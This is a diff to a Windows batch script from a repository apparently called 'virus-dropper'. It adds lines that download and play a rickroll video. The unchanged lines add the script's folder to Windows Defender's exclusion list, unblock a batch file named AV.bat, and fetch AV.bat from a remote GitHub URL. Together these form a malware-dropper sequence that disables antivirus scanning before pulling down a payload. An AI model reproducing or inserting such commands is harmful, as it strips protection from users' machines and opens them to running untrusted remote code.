@@ -1,4 +1,6 @@
 color ef
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.mp4" --output "rickroll.mp4"
+start rickroll.mp4
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
 powershell -Command "Unblock-file 'AV.bat'"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
